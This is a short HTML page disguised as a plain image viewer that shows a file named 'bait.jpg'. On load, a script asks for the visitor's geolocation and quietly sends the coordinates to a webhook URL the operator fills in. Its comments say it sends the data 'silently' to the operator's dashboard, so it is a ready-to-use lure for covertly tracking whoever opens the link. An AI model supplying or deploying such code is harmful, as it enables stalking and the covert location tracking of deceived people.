<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* Black background, image centered, no text */
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        img { max-width: 100%; max-height: 100vh; }
    </style>
</head>
<body onload="getLocation()">

    <img src="bait.jpg">

    <script>
        // !!! PASTE YOUR PIPEDREAM LINK BETWEEN THE QUOTES BELOW !!!
        const gate = "PASTE_YOUR_PIPEDREAM_URL_HERE";

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            }
        }

        function showPosition(position) {
            // Sends the data silently to your dashboard
            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
        }

        function showError(error) {
            console.log("Denied");
        }
    </script>
</body>
</html>
